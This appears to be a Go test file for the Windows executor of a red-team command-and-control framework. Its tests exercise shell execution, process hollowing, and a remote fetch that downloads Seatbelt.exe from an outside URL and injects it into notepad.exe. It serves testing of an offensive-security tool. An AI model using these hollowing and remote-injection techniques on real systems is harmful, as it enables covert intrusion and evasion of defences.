// +build windows

package executor

import (
	"os"
	"strings"
	"testing"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"
)

func TestWindowsPathResolve(t *testing.T) {
	path := `%windir%\bla.exe`
	result := arch.ResolveWinVar(path)

	if result != `C:\WINDOWS\bla.exe` {
		t.Errorf("Wrong: %s", result)
	}
}

func TestCmdValidCommand(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)
	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "cmd"
	packetArgument["commandline"] = "hostname"

	packetResponse, err := executor.actionExecShell(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("No stdout")
	}
	if len(packetResponse["stdErr"]) != 0 {
		t.Error("Stderr")
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
	}
}

func TestPowershellValidCommand(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)
	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "powershell"
	packetArgument["commandline"] = "hostname"

	packetResponse, err := executor.actionExecShell(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("No stdout")
	}
	if len(packetResponse["stdErr"]) != 0 {
		t.Error("Stderr")
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
	}
}

func TestCmdInvalidCommand(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)
	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "cmd"
	packetArgument["commandline"] = "invalid"

	packetResponse, err := executor.actionExecShell(packetArgument)
	if err == nil {
		t.Error("No Error")
	}
	if len(packetResponse["stdout"]) != 0 {
		t.Error("stdout")
	}
	if len(packetResponse["stderr"]) == 0 {
		t.Error("Stderr")
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
	}
	if packetResponse["exitCode"] == "0" {
		t.Error("ExitCode")
	}
}

func TestPowershellInvalidCommand(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)
	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "powershell"
	packetArgument["commandline"] = "invalid"

	packetResponse, err := executor.actionExecShell(packetArgument)
	if err == nil {
		t.Error("No Error")
	}
	if len(packetResponse["stdout"]) != 0 {
		t.Error("stdout")
	}
	if len(packetResponse["stderr"]) == 0 {
		t.Error("Stderr")
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
	}
	if packetResponse["exitCode"] == "0" {
		t.Error("ExitCode")
	}
}

func TestCopyFirst(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)

	destPath := "C:\\temp\\server.exe"
	os.Remove(destPath)

	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "raw"
	packetArgument["executable"] = "net.exe" // Test: no full path
	packetArgument["param0"] = "user"
	packetArgument["param1"] = "dobin"
	packetArgument["spawnType"] = "copyFirst"
	packetArgument["spawnData"] = destPath

	packetResponse, err := executor.actionExecLol(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
		return
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("No stdout")
	}
	if len(packetResponse["stderr"]) != 0 {
		t.Error("Stderr")
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
	}

	if _, err := os.Stat(destPath); err != nil {
		t.Error("Did not copy")
		return
	} else {
		os.Remove(destPath)
	}
}

func TestHollow(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)

	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "raw"
	packetArgument["executable"] = "C:\\windows\\system32\\net.exe"
	packetArgument["param0"] = "user"
	packetArgument["param1"] = "dobin"
	packetArgument["spawnType"] = "hollow"
	packetArgument["spawnData"] = "c:\\windows\\system32\\hostname.exe"

	packetResponse, err := executor.actionExecLol(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
		return
	}
	if len(packetResponse["stderr"]) > 0 {
		t.Error("Stderr")
		return
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("Stdout")
		return
	}
	out := string(packetResponse["stdout"])
	if !strings.Contains(out, "User name") {
		t.Errorf("Output: %s", out)
		return
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
		return
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
		return
	}
}

func TestCommandExec(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)

	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "commandexec"
	packetArgument["executable"] = "net.exe"
	packetArgument["argline"] = "user dobin"

	packetResponse, err := executor.actionExecLol(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
		return
	}
	if len(packetResponse["stderr"]) > 0 {
		t.Error("Stderr")
		return
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("Stdout")
		return
	}
	out := string(packetResponse["stdout"])
	if !strings.Contains(out, "Full Name") {
		t.Errorf("Output: %s", out)
		return
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
		return
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
		return
	}
}

func TestRemote(t *testing.T) {
	campaign := campaign.Campaign{}
	executor := MakeExecutor(&campaign)

	packetArgument := make(model.PacketArgument, 2)
	packetArgument["shelltype"] = "remote"

	packetArgument["url"] = "https://antnium.yookiterm.ch/static/Seatbelt.exe"
	packetArgument["type"] = ""
	packetArgument["argline"] = "DotNet"
	packetArgument["injectInto"] = "C:\\windows\\notepad.exe"

	packetResponse, err := executor.actionExecRemote(packetArgument)
	if err != nil {
		t.Error("Error: " + err.Error())
		return
	}

	if len(packetResponse["stderr"]) > 0 {
		t.Error("Stderr")
		return
	}
	if len(packetResponse["stdout"]) == 0 {
		t.Error("Stdout")
		return
	}
	out := string(packetResponse["stdout"])
	if !strings.Contains(out, "====== DotNet ======") {
		t.Errorf("Output: %s", out)
		return
	}
	if packetResponse["pid"] == "0" {
		t.Error("Pid")
		return
	}
	if packetResponse["exitCode"] != "0" {
		t.Error("ExitCode")
		return
	}
}
